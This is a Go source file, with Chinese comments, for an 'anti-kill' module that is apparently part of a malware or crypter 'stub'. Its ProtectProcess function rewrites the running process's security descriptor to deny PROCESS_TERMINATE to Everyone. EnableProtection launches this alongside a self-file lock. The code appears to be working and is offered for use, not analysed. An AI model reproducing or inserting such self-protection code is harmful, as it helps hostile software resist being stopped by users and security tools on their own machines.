// 文件路径: internal/protect/anti_kill.go
package protect

import (
	"syscall"
	"unsafe"
)

// --- Windows API 常量与结构体精确对齐定义 ---
const (
	PROCESS_TERMINATE           = 0x0001
	DACL_SECURITY_INFORMATION   = 0x00000004
	SE_KERNEL_OBJECT            = 6 // SE_OBJECT_TYPE
	DENY_ACCESS                 = 3 // ACCESS_MODE
	NO_INHERITANCE              = 0x0
	TRUSTEE_IS_SID              = 0
	TRUSTEE_IS_WELL_KNOWN_GROUP = 5
	ERROR_SUCCESS               = 0
)

// TRUSTEE_W 结构体
type TRUSTEE_W struct {
	pMultipleTrustee         uintptr
	MultipleTrusteeOperation uint32
	TrusteeForm              uint32
	TrusteeType              uint32
	ptstrName                uintptr // 指向 SID 或 字符串指针
}

// EXPLICIT_ACCESS_W 结构体
type EXPLICIT_ACCESS_W struct {
	grfAccessPermissions uint32
	grfAccessMode        uint32
	grfInheritance       uint32
	Trustee              TRUSTEE_W
}

var (
	advapi32                     = syscall.NewLazyDLL("advapi32.dll")
	procGetSecurityInfo          = advapi32.NewProc("GetSecurityInfo")
	procSetSecurityInfo          = advapi32.NewProc("SetSecurityInfo")
	procSetEntriesInAclW         = advapi32.NewProc("SetEntriesInAclW")
	procAllocateAndInitializeSid = advapi32.NewProc("AllocateAndInitializeSid")
	procFreeSid                  = advapi32.NewProc("FreeSid")
)

// ProtectProcess 剥夺系统强制结束当前进程的权限
func ProtectProcess() {
	handle := syscall.CurrentProcess()

	var pOldDacl uintptr
	var pSD uintptr

	// 1. 获取当前进程的安全描述符 (Security Descriptor)
	ret, _, _ := procGetSecurityInfo.Call(
		uintptr(handle),
		uintptr(SE_KERNEL_OBJECT),
		uintptr(DACL_SECURITY_INFORMATION),
		0, 0,
		uintptr(unsafe.Pointer(&pOldDacl)),
		0,
		uintptr(unsafe.Pointer(&pSD)),
	)
	if ret != ERROR_SUCCESS {
		return
	}
	defer syscall.LocalFree(syscall.Handle(pSD))

	// 2. 初始化 Everyone 的 SID (Security Identifier)
	var pEveryoneSid uintptr
	// SECURITY_WORLD_SID_AUTHORITY = {0,0,0,0,0,1}
	var SIDAuthWorld = [6]byte{0, 0, 0, 0, 0, 1}

	ret, _, _ = procAllocateAndInitializeSid.Call(
		uintptr(unsafe.Pointer(&SIDAuthWorld)),
		1, 0, 0, 0, 0, 0, 0, 0, 0, // SECURITY_WORLD_RID 为 0
		uintptr(unsafe.Pointer(&pEveryoneSid)),
	)
	if ret == 0 { // 0 表示失败
		return
	}
	defer procFreeSid.Call(pEveryoneSid)

	// 3. 构造显式访问规则 (拒绝结束进程权限)
	var ea EXPLICIT_ACCESS_W
	ea.grfAccessPermissions = PROCESS_TERMINATE
	ea.grfAccessMode = DENY_ACCESS
	ea.grfInheritance = NO_INHERITANCE
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP
	ea.Trustee.ptstrName = pEveryoneSid // 绑定 Everyone 的 SID

	// 4. 将新的拒绝规则合并到旧的 DACL 中，生成新的 DACL
	var pNewDacl uintptr
	ret, _, _ = procSetEntriesInAclW.Call(
		1, // 规则数量
		uintptr(unsafe.Pointer(&ea)),
		pOldDacl,
		uintptr(unsafe.Pointer(&pNewDacl)),
	)
	if ret == ERROR_SUCCESS && pNewDacl != 0 {
		defer syscall.LocalFree(syscall.Handle(pNewDacl))

		// 5. 将包含“防杀规则”的新 DACL 写回当前进程
		procSetSecurityInfo.Call(
			uintptr(handle),
			uintptr(SE_KERNEL_OBJECT),
			uintptr(DACL_SECURITY_INFORMATION),
			0, 0, pNewDacl, 0,
		)
	}
}

// EnableProtection 一键开启全局防御 (供 Stub 主程序调用)
func EnableProtection() {
	// 并发执行，不阻塞主业务加载逻辑
	go LockSelfFile()
	go ProtectProcess()
}
